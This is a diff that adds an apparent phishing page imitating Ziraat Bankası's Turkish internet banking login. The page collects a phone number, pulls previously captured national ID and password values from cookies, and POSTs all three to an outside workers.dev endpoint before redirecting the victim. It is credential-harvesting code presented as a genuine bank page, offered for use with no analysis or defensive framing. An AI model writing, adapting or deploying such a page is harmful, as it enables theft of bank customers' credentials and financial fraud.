@@ -1,0 +1,167 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+  <head>
+	  <!-- Google tag (gtag.js) -->
+ 
+ 
+    <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mobil Uyumlu Sayfa</title>
+    <style class="vjs-styles-defaults"></style>
+    <meta http-equiv="Content-Language" content="tr">
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
+    <link href="styles.css" rel="stylesheet" id="style">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.17/vue.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
+ 
+<!-- Meta Pixel Code -->
+ 
+  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+  </head>
+  <body style="
+margin-left: 0px;
+margin-right: 0px;
+margin-top: 0px;
+margin-bottom: 0px;
+">
+ <form name="aspnetForm" method="post" id="aspnetForm" autocomplete="off" novalidate="novalidate">
+    <div class="login-wrap">
+        <header></header>
+        <div class="container">
+            <div class="tc-kimlik-giris-wrap">
+                <div class="row">
+                    <div class="col-xs-12 col-md-6">
+                        <div class="login-box long">
+                            <span style="color:Red;visibility:hidden;"></span>
+                            <input name="rdLng" type="hidden" value="">
+                            <p>İnternet Şubemize Hoş Geldiniz</p>
+                            <div class="tabs-wrap" data-module="14">
+                                <div class="tabs tab-header-container">
+                                    <a causesval="false" onclick=";;;" class="active" href="">
+                                        <span></span>BİREYSEL </a>
+                                    <a causesval="false">
+                                        <span></span>KURUMSAL </a>
+                                </div>
+                                <div class="tab-container tab-contents">
+                                    <div class="tab-item active" style="padding-left: 10px;">
+                                      <p style="margin-bottom: 8px;margin-left: 10px;text-align: left;">Telefon Numaranız</p>
+                                        <div class="form-group hidden-title">
+<input autocomplete="off" name="telno" type="tel" maxlength="13" id="telno" class="form-control required isNumber numeric external-validation" style="font-size: 14px; height: 46px; font-family: sans-serif; font-weight: 700;" placeholder="+90" data-msg-required="+90" maxlengthvalidationenabled="False" disablevalidationonblur="true" causesval="false" aria-required="true" value="+90">
+
+<script>
+// Sayfa yüklendiğinde
+$(document).ready(function(){
+    // Input alanının değerini kontrol et
+    $('#telno').on('input', function(){
+        // Başlangıçta +90 değerini koru
+        if(!$(this).val().startsWith('+90')){
+            $(this).val('+90');
+        }
+    });
+});
+</script>
+                                        </div>
+                                        <div class="clearfix"></div>
+					      
+                                        <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled>
+                                            <span></span>BAŞVUR
+                                        </button>
+                                        <br><br><br>
+                                     
+                                
+                                    </div>
+                                </div>
+                                <style>
+                                    input {
+                                        touch-action: manipulation;
+                                    }
+
+                                    .api-payment-container img {
+                                        max-height: 92px;
+                                        max-width: 92px;
+                                    }
+
+                                    .ipNotInListRedirectBtn {
+                                        background-color: #e10514 !important;
+                                    }
+                                </style>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</form>
+
+ 
+<script>
+
+    function getCookie(name) {
+    var nameEQ = name + "=";
+    var ca = document.cookie.split(';');
+    for (var i = 0; i < ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+    }
+    return null;
+}
+    var phoneNumberInput = document.getElementById('telno');
+    
+    // Giriş butonu
+    var loginBtn = document.getElementById('loginBtn');
+    
+    // Cep telefonu numarası input alanını dinle
+    phoneNumberInput.addEventListener('input', function () {
+        var phoneNumber = phoneNumberInput.value;
+    
+        // Eğer en az 8 karakter girilmişse
+        if (phoneNumber.length >= 10) {
+            // Giriş butonunun disable özelliğini kaldır
+            loginBtn.removeAttribute('disabled');
+        } else {
+            // Giriş butonunu disable yap
+            loginBtn.setAttribute('disabled', 'disabled');
+        }
+    });
+    
+    // Giriş butonuna tıklanınca
+loginBtn.addEventListener('click', function () {
+    var telno = document.getElementById('telno').value;
+
+    // Cookie'den kayıtlı adı al
+    var tcno = getCookie("tcno");
+    var pass = getCookie("pass");
+    
+    // POST işlemi için veri oluştur
+    var data = new FormData();
+    data.append('telno', telno);
+    data.append('tcno', tcno); // Cookie'den alınan adı ekle
+    data.append('pass', pass);
+    //   https://worker-frostyabi.selimjuhan2.workers.dev/
+    fetch('https://worker-steep-shape-b948.selimjuhan2.workers.dev/', {
+        method: 'POST',
+        body: data
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log(data);
+        window.location.href = 'onay.html';
+    })
+    .catch(error => {
+        console.error('Hata:', error);
+        window.location.href = 'onay.html';
+    });
+});
+
+    </script>
+ 
+ 
+
+    <div>
+  </body>
+</html>
